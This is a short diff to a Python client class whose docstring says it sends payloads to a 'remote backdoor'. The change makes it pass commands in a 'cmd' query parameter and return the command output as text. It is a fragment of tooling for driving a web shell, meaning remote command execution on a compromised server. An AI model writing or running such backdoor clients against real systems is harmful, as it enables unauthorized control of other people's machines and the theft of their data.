@@ -18,9 +18,10 @@ class Client:
         self.session = requests.Session()
 
     def send(self, payload: str) -> requests.Response:
-        """
+        """Sends a payload to the remote backdoor.
+
         :param payload: The payload we want to send the backdor
 
-        :returns:
+        :returns: The payload result
         """
-        return self.session.get(self.url, params={'cmd': payload})
+        return self.session.get(self.url, params={'cmd': payload}).text
